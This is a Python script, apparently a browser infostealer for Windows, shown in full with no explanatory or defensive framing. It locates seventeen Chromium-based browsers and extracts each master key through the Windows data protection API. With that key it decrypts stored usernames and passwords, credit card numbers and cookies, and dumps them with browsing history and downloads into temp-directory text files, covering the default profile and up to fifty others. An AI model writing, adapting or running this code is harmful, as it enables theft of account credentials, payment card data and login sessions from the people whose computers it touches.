from win32crypt import CryptUnprotectData
from datetime import datetime, timedelta
from Cryptodome.Cipher import AES
import tempfile
import sqlite3
import shutil
import base64
import json
import os

appdata = os.getenv('LOCALAPPDATA')
tempdir = tempfile.gettempdir()

browsers = {
    'avast': appdata + '\\AVAST Software\\Browser\\User Data',
    'amigo': appdata + '\\Amigo\\User Data',
    'torch': appdata + '\\Torch\\User Data',
    'kometa': appdata + '\\Kometa\\User Data',
    'orbitum': appdata + '\\Orbitum\\User Data',
    'cent-browser': appdata + '\\CentBrowser\\User Data',
    '7star': appdata + '\\7Star\\7Star\\User Data',
    'sputnik': appdata + '\\Sputnik\\Sputnik\\User Data',
    'vivaldi': appdata + '\\Vivaldi\\User Data',
    'google-chrome-sxs': appdata + '\\Google\\Chrome SxS\\User Data',
    'google-chrome': appdata + '\\Google\\Chrome\\User Data',
    'epic-privacy-browser': appdata + '\\Epic Privacy Browser\\User Data',
    'microsoft-edge': appdata + '\\Microsoft\\Edge\\User Data',
    'uran': appdata + '\\uCozMedia\\Uran\\User Data',
    'yandex': appdata + '\\Yandex\\YandexBrowser\\User Data',
    'brave': appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
    'iridium': appdata + '\\Iridium\\User Data',
}

data_queries = {
    'login_data': {
        'query': 'SELECT origin_url, action_url, username_value, password_value FROM logins',
        'file': '\\Login Data',
        'columns': ['Origin URL', 'Action URL', 'Username', 'Password'],
        'decrypt': True
    },
    'credit_cards': {
        'query': 'SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards',
        'file': '\\Web Data',
        'columns': ['Name on card', 'Card number', 'Expires', 'Modified'],
        'decrypt': True
    },
    'cookies': {
        'query': 'SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies',
        'file': '\\Network\\Cookies',
        'columns': ['Host key', 'Name', 'Path', 'Cookie', 'Expires on'],
        'decrypt': True
    },
    'history': {
        'query': 'SELECT url, title, last_visit_time FROM urls',
        'file': '\\History',
        'columns': ['URL', 'Title', 'Time'],
        'decrypt': False
    },
    'downloads': {
        'query': 'SELECT tab_url, target_path FROM downloads',
        'file': '\\History',
        'columns': ['URL', 'Path'],
        'decrypt': False
    }
}


def get_master_key(path: str):
    if not os.path.exists(path):
        return

    if 'os_crypt' not in open(path + "\\Local State", 'r', encoding='utf-8').read():
        return

    with open(path + "\\Local State", "r", encoding="utf-8") as f:
        c = f.read()

    local_state = json.loads(c)

    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    key = CryptUnprotectData(key, None, None, None, 0)[1]
    return key


def decrypt_password(buff: bytes, key: bytes) -> str:
    iv = buff[3:15]
    payload = buff[15:]
    cipher = AES.new(key, AES.MODE_GCM, iv)
    decrypted_pass = cipher.decrypt(payload)
    decrypted_pass = decrypted_pass[:-16].decode()
    return decrypted_pass


def save_results(browser_name, data_type, content):
    if content is not None:
        temp_dir = tempfile.gettempdir()
        file_path = os.path.join(temp_dir, f"{browser_name}-{data_type}.txt")

        # Check if the file already exists
        if not os.path.exists(file_path):
            with open(file_path, 'w', encoding="utf-8") as file:
                file.write(content)
            print(f"[+] '{data_type}' saved in {file_path}")
        else:
            # Check if the content is not already present in the file
            with open(file_path, 'r', encoding="utf-8") as file:
                existing_content = file.read()

            if content not in existing_content:
                with open(file_path, 'a', encoding="utf-8") as file:
                    file.write(content)
                print(f"[+] '{data_type}' appended to '{file_path}'")
            else:
                print(f"[-] '{data_type}' already exists in '{file_path}'")


def get_data(path: str, profile: str, key, data_type):
    db_file = f'{path}\\{profile}{data_type["file"]}'
    if not os.path.exists(db_file):
        return

    result = ""
    shutil.copy(db_file, 'temp_db')
    conn = sqlite3.connect('temp_db')
    cursor = conn.cursor()
    cursor.execute(data_type['query'])

    for row in cursor.fetchall():
        row = list(row)
        if data_type['decrypt']:
            for i in range(len(row)):
                if isinstance(row[i], bytes):
                    row[i] = decrypt_password(row[i], key)

        if data_type_name == 'history':
            if row[2] != 0:
                row[2] = convert_chrome_time(row[2])
            else:
                row[2] = "0"

        result += "\n".join([f"{col}: {val}" for col, val in zip(data_type['columns'], row)]) + "\n\n"

    conn.close()
    os.remove('temp_db')
    return result


def convert_chrome_time(chrome_time):
    return (datetime(1601, 1, 1) + timedelta(microseconds=chrome_time)).strftime('%d/%m/%Y %H:%M:%S')


def installed_browsers():
    available = []
    for x in browsers.keys():
        if os.path.exists(browsers[x]):
            available.append(x)
    return available


if __name__ == '__main__':
    available_browsers = installed_browsers()

    for browser in available_browsers:
        browser_path = browsers[browser]
        master_key = get_master_key(browser_path)

        for data_type_name, data_type in data_queries.items():
            try:
                data = get_data(browser_path, "Default", master_key, data_type)
                save_results(browser, data_type_name, data)
            except Exception as e:
                print(e)

            for i in range(1, 51):
                profile = f'Profile {i}'
                try:
                    data = get_data(browser_path, profile, master_key, data_type)
                    save_results(browser, data_type_name, data)
                except Exception as e:
                    print(e)
